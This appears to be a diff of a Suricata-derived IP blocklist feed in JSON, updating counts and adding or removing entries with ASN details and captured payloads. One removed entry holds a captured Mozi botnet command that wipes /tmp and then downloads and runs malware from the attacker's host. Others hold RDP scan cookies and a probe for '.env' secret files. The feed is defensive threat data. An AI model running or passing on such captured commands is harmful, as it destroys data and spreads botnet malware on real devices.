@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-08-24T13:00:00Z",
+  "generated_at": "2026-08-25T01:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 63,
-    "v4": 63,
+    "total": 51,
+    "v4": 51,
     "v6": 0
   },
   "items": [
@@ -700,210 +700,6 @@
       ]
     },
     {
-      "ip": "5.180.252.158",
-      "family": "v4",
-      "first_seen": "2026-08-17T20:00:00Z",
-      "last_seen": "2026-08-17T20:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN MS Terminal Server Traffic on Non-standard Port"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "44486",
-      "asn_name": "SYNLINQ Oliver Horscht is trading as \"SYNLINQ\"",
-      "asn_prefix": "5.180.252.0/23",
-      "payloads": [
-        "\u0003+&\\xe0Cookie: mstshash=hello"
-      ]
-    },
-    {
-      "ip": "17.248.250.24",
-      "family": "v4",
-      "first_seen": "2026-08-17T20:00:00Z",
-      "last_seen": "2026-08-17T20:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA UDPv4 invalid checksum"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "714",
-      "asn_name": "APPLE-ENGINEERING - Apple Inc.",
-      "asn_prefix": "17.248.128.0/17"
-    },
-    {
-      "ip": "17.248.250.22",
-      "family": "v4",
-      "first_seen": "2026-08-17T20:00:00Z",
-      "last_seen": "2026-08-17T20:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA UDPv4 invalid checksum"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "714",
-      "asn_name": "APPLE-ENGINEERING - Apple Inc.",
-      "asn_prefix": "17.248.128.0/17"
-    },
-    {
-      "ip": "17.248.250.18",
-      "family": "v4",
-      "first_seen": "2026-08-17T20:00:00Z",
-      "last_seen": "2026-08-17T20:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA UDPv4 invalid checksum"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "714",
-      "asn_name": "APPLE-ENGINEERING - Apple Inc.",
-      "asn_prefix": "17.248.128.0/17"
-    },
-    {
-      "ip": "17.248.250.5",
-      "family": "v4",
-      "first_seen": "2026-08-17T20:00:00Z",
-      "last_seen": "2026-08-17T20:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA UDPv4 invalid checksum"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "714",
-      "asn_name": "APPLE-ENGINEERING - Apple Inc.",
-      "asn_prefix": "17.248.128.0/17"
-    },
-    {
-      "ip": "118.194.228.239",
-      "family": "v4",
-      "first_seen": "2026-08-17T19:00:00Z",
-      "last_seen": "2026-08-17T19:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN MS Terminal Server Traffic on Non-standard Port"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "135377",
-      "asn_name": "UCLOUD-HK-AS-AP UCLOUD INFORMATION TECHNOLOGY HK LIMITED",
-      "asn_prefix": "118.194.228.0/24",
-      "payloads": [
-        "\u00033.\\xe0Cookie: mstshash=Administrator"
-      ]
-    },
-    {
-      "ip": "118.251.114.248",
-      "family": "v4",
-      "first_seen": "2026-08-17T18:00:00Z",
-      "last_seen": "2026-08-17T18:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "4134",
-      "asn_name": "CHINANET-BACKBONE No.31,Jin-rong Street",
-      "asn_prefix": "118.248.0.0/13",
-      "payloads": [
-        "GET /shell?cd+/tmp;rm+-rf+*;wget+http://118.251.114.248:37782/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
-      ]
-    },
-    {
-      "ip": "17.248.250.16",
-      "family": "v4",
-      "first_seen": "2026-08-17T18:00:00Z",
-      "last_seen": "2026-08-17T18:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA UDPv4 invalid checksum"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "714",
-      "asn_name": "APPLE-ENGINEERING - Apple Inc.",
-      "asn_prefix": "17.248.128.0/17"
-    },
-    {
-      "ip": "17.248.250.17",
-      "family": "v4",
-      "first_seen": "2026-08-17T18:00:00Z",
-      "last_seen": "2026-08-17T18:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA UDPv4 invalid checksum"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "714",
-      "asn_name": "APPLE-ENGINEERING - Apple Inc.",
-      "asn_prefix": "17.248.128.0/17"
-    },
-    {
-      "ip": "17.248.250.20",
-      "family": "v4",
-      "first_seen": "2026-08-17T18:00:00Z",
-      "last_seen": "2026-08-17T18:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA UDPv4 invalid checksum"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "714",
-      "asn_name": "APPLE-ENGINEERING - Apple Inc.",
-      "asn_prefix": "17.248.128.0/17"
-    },
-    {
-      "ip": "17.248.250.19",
-      "family": "v4",
-      "first_seen": "2026-08-17T18:00:00Z",
-      "last_seen": "2026-08-17T18:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA UDPv4 invalid checksum"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "714",
-      "asn_name": "APPLE-ENGINEERING - Apple Inc.",
-      "asn_prefix": "17.248.128.0/17"
-    },
-    {
-      "ip": "17.248.250.13",
-      "family": "v4",
-      "first_seen": "2026-08-17T18:00:00Z",
-      "last_seen": "2026-08-17T18:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA UDPv4 invalid checksum"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "714",
-      "asn_name": "APPLE-ENGINEERING - Apple Inc.",
-      "asn_prefix": "17.248.128.0/17"
-    },
-    {
-      "ip": "194.233.73.211",
-      "family": "v4",
-      "first_seen": "2026-08-17T18:00:00Z",
-      "last_seen": "2026-08-17T18:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN MS Terminal Server Traffic on Non-standard Port"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "141995",
-      "asn_name": "CAPL-AS-AP - Contabo Asia Private Limited",
-      "asn_prefix": "194.233.72.0/22"
-    },
-    {
       "ip": "169.58.152.81",
       "family": "v4",
       "first_seen": "2026-08-22T14:00:00Z",
@@ -1201,6 +997,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "1897",
+      "asn_name": "EUNETPT NOS COMUNICACOES, S.A.",
+      "asn_prefix": "193.126.0.0/16",
       "payloads": [
         "\"\u001d\\xfc\\xeb\\x8a\u001e\\xe60\\xbc+\\xa0_\"b9X<\\xbe\\x9e8\\xdbl\\xf4GI\\xcc\\xdc+F\\xb6\\xc3\\xe3ORVe\\xf9]#\\x95N\\xc3\\xfa\\xfc\\xdc\\x8b\\xfa0\\x8e2\\xcd\\xb8N.OdF\u0010\\x82\\x8ae\\x86\\x87\\x82|\\xd2\\xd4dt\\xe9N\\x9c\\xd4=\u007f\\xff`|\\xa3!\\x9ae\\xc5\u0018\\xc43\\xf3\\xcd\\xa1c\\xb2\\xd7\\xfe\\xd7\\xa1\\x8e?3\\xfc\\xed\u001c\\x8cy\\xfeZ\\xbf\\xab]4\\xba\\\\xc8\u001e\u0004&\u001b\\x94~l @\\xe1\\xc5\\xe4\\xb4\\x8f\\x87\\xf7\\xe5\u0018\"\\x92\\xbc\\x8d\\xae7\\xbf\\xf2"
       ]
@@ -1221,6 +1020,27 @@
       "asn_prefix": "169.58.128.0/17",
       "payloads": [
         "GET /.env"
+      ]
+    },
+    {
+      "ip": "172.189.127.24",
+      "family": "v4",
+      "first_seen": "2026-08-24T17:00:00Z",
+      "last_seen": "2026-08-24T17:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "172.160.0.0/11",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /c/msdownload/update/software/defu/2026/08/am_delta_patch_1.457.309.0_7ba9190e1e930312c9af9603e53a766efabd9a93.exe?cacheHostOrigin=2.au.download.windowsupdate.com"
       ]
     }
   ]
